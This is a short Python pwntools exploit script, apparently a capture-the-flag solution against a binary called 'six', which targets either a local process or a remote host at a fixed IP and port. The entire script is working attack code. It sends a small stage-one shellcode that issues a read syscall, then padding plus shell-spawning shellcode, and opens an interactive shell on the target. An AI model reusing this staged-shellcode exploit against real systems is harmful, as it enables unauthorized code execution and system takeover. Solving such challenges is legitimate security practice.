#! /usr/bin/env py
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./six"
context.arch="amd64"
elf=ELF(pwn_file)
if len(sys.argv)==1:
    r=process(pwn_file)
else:
    r=remote("49.4.79.115",31238)

code="""
    push rsp
    pop rsi
    mov edx,esi
    syscall
"""
r.sendafter("Show Ne0 your shellcode:\n",asm(code))

data="a"*(0x1036-0x500)+asm(shellcraft.sh())
pause()
r.sendline(data)
r.interactive()
